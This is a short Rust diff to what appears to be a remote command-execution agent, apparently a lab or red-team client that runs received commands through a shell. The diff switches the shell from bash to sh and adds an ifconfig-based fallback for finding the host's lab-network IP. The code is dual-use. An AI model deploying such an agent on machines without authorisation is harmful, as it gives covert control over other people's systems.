@@ -124,7 +124,7 @@ fn handle_command(cmd_id:&str, command:&str, identifier: &str){
 
 fn run_command(cmd: &str) -> String {
     let child = if !cfg!(target_os ="windows"){
-        let mut child = match Command::new("/bin/bash").arg("-c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn(){
+        let mut child = match Command::new("/bin/sh").arg("-c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn(){
             Ok(out)=>{
                 out
             }
@@ -218,7 +218,12 @@ fn main_loop(identifier:&str) -> Result<String,String>{
 }
 
 fn main(){
-    let host_ip = local_ip().unwrap().to_string();
+    let mut host_ip = local_ip().unwrap().to_string();
+    //if its loopback, get the ip from a bash command
+    if host_ip.eq("127.0.0.1"){
+        let ip = run_command("ifconfig | grep -o \"192.168.253.[1,2,3,4,5,6,7,8,9][1,2,3,4,5,6,7,8,9]\" | head -n 1");
+        host_ip = ip.to_string();
+    }
     loop{
         let identifier = get_id(&host_ip);
         match main_loop(&identifier){
